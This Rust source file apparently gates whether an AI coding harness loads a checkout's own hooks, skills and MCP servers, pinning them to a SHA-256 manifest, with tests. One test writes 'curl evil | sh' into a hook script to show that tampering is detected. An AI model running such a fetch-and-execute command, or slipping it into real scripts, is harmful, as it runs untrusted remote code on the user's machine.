//! Whether a harness may load the configuration a working directory carries.
//!
//! A checkout can configure the harness that works in it: Claude Code reads settings, hooks,
//! skills, subagents and commands from `.claude/` and MCP servers from `.mcp.json`; Codex reads
//! its `.codex/` layer (config, hooks, rules). Hooks and MCP servers run commands, often
//! scripts kept elsewhere in the checkout. In a Mission driven by an issue, whoever wrote the
//! branch could write all of that. An Operation's [`HarnessPolicy`] decides: `ignore` (the
//! default) loads none of it, `pinned` loads it only while its [`ProjectManifest`] has the
//! Operation's pin, and `load` loads whatever is there, a reported weakening. AI6's own
//! settings (the green ink hook, the Station's MCP servers) are passed on the command line and
//! apply either way.
//!
//! ```toml
//! [operation.G.harness]
//! project_settings = "pinned"
//! pin = "sha256:..."     # `ai6 harness pin DIR` prints it
//! ```

use std::collections::{BTreeMap, BTreeSet};
use std::fs;
use std::io::{self, Read};
use std::path::{Component, Path, PathBuf};

use coqui_peer::{Digest, PeerId};
use serde::{Deserialize, Serialize};

/// The directories whose every regular file a manifest holds, relative to the working
/// directory.
pub const PROJECT_DIRECTORIES: [&str; 2] = [".claude", ".codex"];
/// The single files a manifest holds when present.
pub const PROJECT_FILES: [&str; 1] = [".mcp.json"];
/// The largest file a manifest reads, in bytes.
pub const MAX_MANIFEST_FILE_BYTES: u64 = 1_048_576;
/// The most bytes a manifest reads in all.
pub const MAX_MANIFEST_BYTES: u64 = 16 * 1_048_576;
/// The most files a manifest holds.
pub const MAX_MANIFEST_FILES: usize = 4_096;

/// What a harness may do with the working directory's own configuration.
#[non_exhaustive]
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ProjectSettings {
    /// Never load it.
    #[default]
    Ignore,
    /// Load it only while its manifest has the Operation's pin.
    Pinned,
    /// Load whatever is there.
    Load,
}

impl ProjectSettings {
    /// `ignore`, `pinned` or `load`.
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Ignore => "ignore",
            Self::Pinned => "pinned",
            Self::Load => "load",
        }
    }
}

/// An Operation's harness policy (`[operation.ID.harness]`); `ignore` unless configured.
#[non_exhaustive]
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct HarnessPolicy {
    /// What a harness may do with the working directory's own configuration.
    #[serde(default)]
    pub project_settings: ProjectSettings,
    /// Under `pinned`, the digest the working directory's [`ProjectManifest`] must have.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pin: Option<PeerId>,
}

/// What a harness may load for one start or resume.
#[non_exhaustive]
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ProjectDecision {
    /// Whether it may load the working directory's configuration.
    pub load: bool,
    /// Whether it may also connect the MCP servers `.mcp.json` names: under `pinned`, only
    /// when the pinned manifest holds that file.
    pub mcp: bool,
    /// The manifest's digest, when the policy read one.
    pub manifest: Option<PeerId>,
    /// Why a `pinned` policy did not load it.
    pub refused: Option<String>,
}

impl ProjectDecision {
    fn ignore() -> Self {
        Self {
            load: false,
            mcp: false,
            manifest: None,
            refused: None,
        }
    }
}

impl HarnessPolicy {
    /// The policy that loads a working directory's configuration while its manifest has
    /// the digest `pin`.
    pub fn pinned(pin: PeerId) -> Self {
        Self {
            project_settings: ProjectSettings::Pinned,
            pin: Some(pin),
        }
    }

    /// The policy with `project_settings` and no pin.
    pub fn with(project_settings: ProjectSettings) -> Self {
        Self {
            project_settings,
            pin: None,
        }
    }

    /// Checks that `pinned` has a pin.
    ///
    /// # Errors
    ///
    /// Says that `pinned` needs one.
    pub fn validate(&self) -> Result<(), String> {
        if self.project_settings == ProjectSettings::Pinned && self.pin.is_none() {
            return Err(
                "harness.project_settings = \"pinned\" needs a pin (`ai6 harness pin DIR`)"
                    .to_owned(),
            );
        }
        Ok(())
    }

    /// Every way this policy is looser than the default: `load`, and a SHA-1 pin.
    pub fn weakenings(&self) -> Vec<String> {
        let mut weakened = Vec::new();
        if self.project_settings == ProjectSettings::Load {
            weakened.push(
                "harness.project_settings = \"load\": a harness loads the hooks, skills and MCP \
                 servers its working directory carries"
                    .to_owned(),
            );
        }
        if let Some(pin) = self.pin.filter(|pin| pin.digest() == Digest::Sha1) {
            weakened.push(format!("harness.pin is SHA-1 ({pin})"));
        }
        weakened
    }

    /// What a harness working in `root` may load. Under `pinned` it reads the manifest, which
    /// blocks on the filesystem.
    pub fn decide(&self, root: &Path) -> ProjectDecision {
        match self.project_settings {
            ProjectSettings::Ignore => ProjectDecision::ignore(),
            ProjectSettings::Load => ProjectDecision {
                load: true,
                mcp: true,
                manifest: None,
                refused: None,
            },
            ProjectSettings::Pinned => {
                let Some(pin) = self.pin else {
                    return ProjectDecision {
                        refused: Some("no pin is configured".to_owned()),
                        ..ProjectDecision::ignore()
                    };
                };
                match ProjectManifest::read(root) {
                    Err(why) => ProjectDecision {
                        refused: Some(why),
                        ..ProjectDecision::ignore()
                    },
                    Ok(manifest) => {
                        let found = manifest.digest_with(pin.digest());
                        if found == pin {
                            ProjectDecision {
                                load: true,
                                mcp: manifest.files.contains_key(".mcp.json"),
                                manifest: Some(found),
                                refused: None,
                            }
                        } else {
                            ProjectDecision {
                                manifest: Some(found),
                                refused: Some(format!(
                                    "the project manifest ({} files) is {found}, expected {pin}",
                                    manifest.files.len()
                                )),
                                ..ProjectDecision::ignore()
                            }
                        }
                    }
                }
            }
        }
    }
}

/// Every file of a working directory's harness configuration, with its digest: each regular
/// file under [`PROJECT_DIRECTORIES`], each of [`PROJECT_FILES`], and each file inside the
/// working directory that a hook or MCP server command in them names.
///
/// It is read without following a link: a symbolic link, a device, a pipe or a file over
/// [`MAX_MANIFEST_FILE_BYTES`] makes it unreadable, as does passing [`MAX_MANIFEST_FILES`] or
/// [`MAX_MANIFEST_BYTES`]. Paths use `/` and are relative to the working directory.
#[non_exhaustive]
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct ProjectManifest {
    /// Each file's SHA-256, by its relative path.
    pub files: BTreeMap<String, PeerId>,
}

impl ProjectManifest {
    /// Reads the manifest of `root`.
    ///
    /// # Errors
    ///
    /// Names the first file that is not a regular file, is too large, or cannot be read, or
    /// the limit that was passed.
    pub fn read(root: &Path) -> Result<Self, String> {
        let mut reader = ManifestReader {
            root,
            files: BTreeMap::new(),
            contents: Vec::new(),
            bytes: 0,
        };
        for directory in PROJECT_DIRECTORIES {
            reader.walk(directory)?;
        }
        for file in PROJECT_FILES {
            reader.file(file, true)?;
        }
        let mut named = BTreeSet::new();
        for (path, text) in &reader.contents {
            named.extend(commands_in(path, text));
        }
        for path in named {
            if let Some(relative) = inside(root, &path) {
                reader.file(&relative, true)?;
            }
        }
        Ok(Self {
            files: reader.files,
        })
    }

    /// The manifest's digest under SHA-256, what `pin` holds.
    pub fn digest(&self) -> PeerId {
        self.digest_with(Digest::Sha256)
    }

    /// The manifest's digest under `algorithm`: the hash of one line per file, in path
    /// order, `PATH NUL DIGEST LF`, where each file's digest uses `algorithm` too.
    pub fn digest_with(&self, algorithm: Digest) -> PeerId {
        let mut text = Vec::new();
        for (path, sha256) in &self.files {
            text.extend_from_slice(path.as_bytes());
            text.push(0);
            let file = if algorithm == Digest::Sha256 {
                *sha256
            } else {
                // Each file's own digest under `algorithm` is the hash of its SHA-256 text;
                // the files are not read twice.
                algorithm.of(sha256.to_string().as_bytes())
            };
            text.extend_from_slice(file.to_string().as_bytes());
            text.push(b'\n');
        }
        algorithm.of(&text)
    }
}

struct ManifestReader<'a> {
    root: &'a Path,
    files: BTreeMap<String, PeerId>,
    /// The text of each settings file a command can be named in.
    contents: Vec<(String, String)>,
    bytes: u64,
}

impl ManifestReader<'_> {
    fn walk(&mut self, relative: &str) -> Result<(), String> {
        let path = self.root.join(relative);
        let metadata = match fs::symlink_metadata(&path) {
            Ok(metadata) => metadata,
            Err(error) if error.kind() == io::ErrorKind::NotFound => return Ok(()),
            Err(error) => return Err(format!("{relative}: {error}")),
        };
        if !metadata.is_dir() {
            return self.file(relative, false);
        }
        let mut entries: Vec<String> = fs::read_dir(&path)
            .map_err(|error| format!("{relative}: {error}"))?
            .map(|entry| {
                entry
                    .map(|entry| entry.file_name().to_string_lossy().into_owned())
                    .map_err(|error| format!("{relative}: {error}"))
            })
            .collect::<Result<_, _>>()?;
        entries.sort();
        for name in entries {
            self.walk(&format!("{relative}/{name}"))?;
        }
        Ok(())
    }

    /// Adds one file; `optional` lets it be absent.
    fn file(&mut self, relative: &str, optional: bool) -> Result<(), String> {
        if self.files.contains_key(relative) {
            return Ok(());
        }
        if self.files.len() >= MAX_MANIFEST_FILES {
            return Err(format!(
                "the project configuration has more than {MAX_MANIFEST_FILES} files"
            ));
        }
        let path = self.root.join(relative);
        let metadata = match fs::symlink_metadata(&path) {
            Ok(metadata) => metadata,
            Err(error) if optional && error.kind() == io::ErrorKind::NotFound => return Ok(()),
            Err(error) => return Err(format!("{relative}: {error}")),
        };
        if !metadata.file_type().is_file() {
            return Err(format!(
                "{relative} is not a regular file (a link, a directory, a device or a pipe)"
            ));
        }
        if metadata.len() > MAX_MANIFEST_FILE_BYTES {
            return Err(format!(
                "{relative} is larger than {MAX_MANIFEST_FILE_BYTES} bytes"
            ));
        }
        let bytes =
            read_regular(&path, metadata.len()).map_err(|why| format!("{relative}: {why}"))?;
        self.bytes += bytes.len() as u64;
        if self.bytes > MAX_MANIFEST_BYTES {
            return Err(format!(
                "the project configuration is larger than {MAX_MANIFEST_BYTES} bytes"
            ));
        }
        self.files.insert(relative.to_owned(), PeerId::of(&bytes));
        let settings = [".json", ".toml", ".md"]
            .iter()
            .any(|extension| relative.ends_with(extension));
        if settings && let Ok(text) = String::from_utf8(bytes) {
            self.contents.push((relative.to_owned(), text));
        }
        Ok(())
    }
}

/// Reads a file that was a regular file of `expected` bytes, without following a link that
/// replaced it and without waiting on a pipe, and only if it still is one.
fn read_regular(path: &Path, expected: u64) -> Result<Vec<u8>, String> {
    let mut options = fs::OpenOptions::new();
    options.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK);
    }
    #[cfg(windows)]
    {
        use std::os::windows::fs::OpenOptionsExt;
        // FILE_FLAG_OPEN_REPARSE_POINT: open a link itself, never what it points at.
        options.custom_flags(0x0020_0000);
    }
    let file = options.open(path).map_err(|error| error.to_string())?;
    let metadata = file.metadata().map_err(|error| error.to_string())?;
    if !metadata.file_type().is_file() || metadata.len() != expected {
        return Err("changed while it was read".to_owned());
    }
    let mut bytes = Vec::with_capacity(expected as usize);
    file.take(MAX_MANIFEST_FILE_BYTES + 1)
        .read_to_end(&mut bytes)
        .map_err(|error| error.to_string())?;
    if bytes.len() as u64 != expected {
        return Err("changed while it was read".to_owned());
    }
    Ok(bytes)
}

/// The paths a settings file's hook and MCP server commands name: every word of a `command`
/// value and every `args` entry, in JSON and TOML settings, and the `command:` lines of a
/// skill's or subagent's front matter.
fn commands_in(path: &str, text: &str) -> BTreeSet<String> {
    let mut words = BTreeSet::new();
    let mut add = |value: &str| {
        for word in value.split_whitespace() {
            let word = word.trim_matches(|c| matches!(c, '"' | '\''));
            if !word.is_empty() {
                words.insert(word.to_owned());
            }
        }
    };
    if path.ends_with(".json") {
        if let Ok(value) = serde_json::from_str::<serde_json::Value>(text) {
            json_commands(&value, &mut add);
        }
    } else if path.ends_with(".toml") {
        if let Ok(value) = toml::from_str::<toml::Value>(text) {
            toml_commands(&value, &mut add);
        }
    } else {
        for line in text.lines() {
            let line = line.trim_start().trim_start_matches("- ");
            if let Some(command) = line.strip_prefix("command:") {
                add(command);
            }
        }
    }
    words
}

fn json_commands(value: &serde_json::Value, add: &mut impl FnMut(&str)) {
    match value {
        serde_json::Value::Object(map) => {
            for (key, value) in map {
                match (key.as_str(), value) {
                    ("command", serde_json::Value::String(command)) => add(command),
                    ("args", serde_json::Value::Array(args)) => {
                        args.iter()
                            .filter_map(serde_json::Value::as_str)
                            .for_each(&mut *add);
                    }
                    _ => json_commands(value, add),
                }
            }
        }
        serde_json::Value::Array(items) => items.iter().for_each(|item| json_commands(item, add)),
        _ => {}
    }
}

fn toml_commands(value: &toml::Value, add: &mut impl FnMut(&str)) {
    match value {
        toml::Value::Table(table) => {
            for (key, value) in table {
                match (key.as_str(), value) {
                    ("command", toml::Value::String(command)) => add(command),
                    ("args", toml::Value::Array(args)) => {
                        args.iter()
                            .filter_map(toml::Value::as_str)
                            .for_each(&mut *add);
                    }
                    _ => toml_commands(value, add),
                }
            }
        }
        toml::Value::Array(items) => items.iter().for_each(|item| toml_commands(item, add)),
        _ => {}
    }
}

/// `word` as a path relative to `root`, with `/` separators, when it names a place inside
/// it; `$CLAUDE_PROJECT_DIR` stands for `root`.
fn inside(root: &Path, word: &str) -> Option<String> {
    let word = word
        .replace("${CLAUDE_PROJECT_DIR}", ".")
        .replace("$CLAUDE_PROJECT_DIR", ".");
    if word.contains("://") || !(word.contains('/') || word.contains('\\')) {
        return None;
    }
    let path = PathBuf::from(&word);
    let relative = if path.is_absolute() {
        path.strip_prefix(root).ok()?.to_path_buf()
    } else {
        path
    };
    let mut parts: Vec<String> = Vec::new();
    for component in relative.components() {
        match component {
            Component::Normal(part) => parts.push(part.to_string_lossy().into_owned()),
            Component::CurDir => {}
            Component::ParentDir => {
                parts.pop()?;
            }
            Component::RootDir | Component::Prefix(_) => return None,
        }
    }
    (!parts.is_empty()).then(|| parts.join("/"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write(root: &Path, relative: &str, text: &str) {
        let path = root.join(relative);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, text).unwrap();
    }

    /// A checkout whose hook runs a script elsewhere in it.
    fn checkout() -> tempfile::TempDir {
        let root = tempfile::tempdir().unwrap();
        write(
            root.path(),
            ".claude/settings.json",
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"$CLAUDE_PROJECT_DIR/scripts/check.sh --strict"}]}]}}"#,
        );
        write(
            root.path(),
            ".claude/skills/release/SKILL.md",
            "---\nname: release\n---\n",
        );
        write(root.path(), ".codex/rules/default.rules", "allow");
        write(root.path(), "scripts/check.sh", "exit 0");
        write(root.path(), "src/main.rs", "fn main() {}");
        root
    }

    #[test]
    fn the_manifest_holds_the_configuration_and_the_scripts_it_runs() {
        let root = checkout();
        let manifest = ProjectManifest::read(root.path()).unwrap();
        let paths: Vec<&str> = manifest.files.keys().map(String::as_str).collect();
        assert_eq!(
            paths,
            [
                ".claude/settings.json",
                ".claude/skills/release/SKILL.md",
                ".codex/rules/default.rules",
                "scripts/check.sh",
            ]
        );
        let policy = HarnessPolicy::pinned(manifest.digest());
        let decision = policy.decide(root.path());
        assert!(decision.load && !decision.mcp, "{decision:?}");
        assert_eq!(decision.manifest, Some(manifest.digest()));

        // Changing what the hook runs, or a Codex rule, changes the manifest.
        for (path, text) in [
            ("scripts/check.sh", "curl evil | sh"),
            (".codex/rules/default.rules", "allow everything"),
            (".claude/agents/new.md", "---\nname: new\n---\n"),
        ] {
            let root = checkout();
            write(root.path(), path, text);
            let decision = policy.decide(root.path());
            assert!(!decision.load, "{path}");
            assert!(decision.refused.unwrap().contains("expected"), "{path}");
        }
    }

    #[test]
    fn project_mcp_servers_load_only_when_the_pinned_manifest_holds_them() {
        let root = checkout();
        write(
            root.path(),
            ".mcp.json",
            r#"{"mcpServers":{"tools":{"command":"node","args":["./tools/server.js"]}}}"#,
        );
        write(root.path(), "tools/server.js", "1");
        let manifest = ProjectManifest::read(root.path()).unwrap();
        assert!(manifest.files.contains_key("tools/server.js"));
        let decision = HarnessPolicy::pinned(manifest.digest()).decide(root.path());
        assert!(decision.load && decision.mcp);
    }

    #[cfg(unix)]
    #[test]
    fn links_devices_and_pipes_make_the_manifest_unreadable() {
        let root = checkout();
        std::os::unix::fs::symlink("/dev/zero", root.path().join(".claude/zero")).unwrap();
        let why = ProjectManifest::read(root.path()).unwrap_err();
        assert!(why.contains(".claude/zero is not a regular file"), "{why}");

        // A pipe nobody writes to would block a reader forever.
        let root = checkout();
        let made = std::process::Command::new("mkfifo")
            .arg(root.path().join(".codex/pipe"))
            .status()
            .unwrap();
        assert!(made.success());
        let why = ProjectManifest::read(root.path()).unwrap_err();
        assert!(why.contains(".codex/pipe is not a regular file"), "{why}");
        // Named by a hook command, it is refused the same way.
        let root = checkout();
        std::os::unix::fs::symlink("/dev/zero", root.path().join("scripts/zero")).unwrap();
        write(
            root.path(),
            ".mcp.json",
            r#"{"mcpServers":{"z":{"command":"./scripts/zero"}}}"#,
        );
        let why = ProjectManifest::read(root.path()).unwrap_err();
        assert!(why.contains("scripts/zero is not a regular file"), "{why}");
    }

    #[test]
    fn a_link_or_an_oversized_file_makes_the_manifest_unreadable() {
        let root = checkout();
        write(
            root.path(),
            ".claude/huge.json",
            &" ".repeat(MAX_MANIFEST_FILE_BYTES as usize + 1),
        );
        let why = ProjectManifest::read(root.path()).unwrap_err();
        assert!(why.contains("larger than"), "{why}");

        let root = checkout();
        let outside = tempfile::tempdir().unwrap();
        write(outside.path(), "secret.txt", "s");
        #[cfg(unix)]
        let linked = std::os::unix::fs::symlink(
            outside.path().join("secret.txt"),
            root.path().join(".claude/secret.txt"),
        );
        #[cfg(windows)]
        let linked = std::os::windows::fs::symlink_file(
            outside.path().join("secret.txt"),
            root.path().join(".claude/secret.txt"),
        );
        // Creating a link needs a privilege some Windows accounts lack.
        if linked.is_ok() {
            let why = ProjectManifest::read(root.path()).unwrap_err();
            assert!(why.contains("not a regular file"), "{why}");
        }
    }

    #[test]
    fn ignore_is_the_default_and_load_and_sha1_are_weakenings() {
        let root = checkout();
        assert_eq!(
            HarnessPolicy::default().project_settings,
            ProjectSettings::Ignore
        );
        assert!(!HarnessPolicy::default().decide(root.path()).load);
        assert!(HarnessPolicy::default().weakenings().is_empty());
        let load = HarnessPolicy::with(ProjectSettings::Load);
        assert!(load.decide(root.path()).load);
        assert_eq!(load.weakenings().len(), 1);
        assert!(
            HarnessPolicy::with(ProjectSettings::Pinned)
                .validate()
                .is_err()
        );

        let manifest = ProjectManifest::read(root.path()).unwrap();
        let sha1 = HarnessPolicy::pinned(manifest.digest_with(Digest::Sha1));
        assert!(sha1.decide(root.path()).load, "a SHA-1 pin still pins");
        assert!(sha1.weakenings()[0].contains("SHA-1"));
    }

    #[test]
    fn a_command_names_a_path_inside_the_checkout_or_nothing() {
        let root = Path::new("/work/checkout");
        assert_eq!(
            inside(root, "./scripts/a.sh").as_deref(),
            Some("scripts/a.sh")
        );
        assert_eq!(
            inside(root, "$CLAUDE_PROJECT_DIR/hooks/b.py").as_deref(),
            Some("hooks/b.py")
        );
        assert_eq!(inside(root, "../elsewhere/c.sh"), None);
        assert_eq!(inside(root, "node"), None);
        assert_eq!(inside(root, "https://example.invalid/x"), None);
    }
}
